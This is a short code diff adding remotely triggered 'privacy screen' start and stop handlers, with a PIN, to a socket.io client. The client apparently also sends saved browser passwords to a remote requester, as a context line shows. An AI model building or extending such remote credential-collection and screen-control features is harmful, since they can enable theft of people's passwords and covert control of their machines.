@@ -894,6 +894,38 @@ def _make_client():
         except Exception as e:
             sio.emit("browser_passwords_result", {"passwords": [], "error": str(e), "_requester": data.get("_requester") if data else None})
 
+    # ── Privacy Screen ────────────────────────────────────────────────────────
+    @sio.on("privacy_start")
+    def _on_privacy_start(data):
+        try:
+            import privacy_screen as ps
+            ok, msg = ps.start_privacy_screen(
+                message=(data or {}).get("message"),
+                pin=(data or {}).get("pin"),
+            )
+            sio.emit("privacy_result", {
+                "ok": ok, "running": ok,
+                "status": "active" if ok else "error",
+                "message": msg,
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("privacy_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    @sio.on("privacy_stop")
+    def _on_privacy_stop(data):
+        try:
+            import privacy_screen as ps
+            ok, reason = ps.stop_privacy_screen(pin=(data or {}).get("pin"))
+            sio.emit("privacy_result", {
+                "ok": ok, "running": not ok,
+                "status": "inactive" if ok else "active",
+                "message": reason,
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("privacy_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
     return sio
 
 
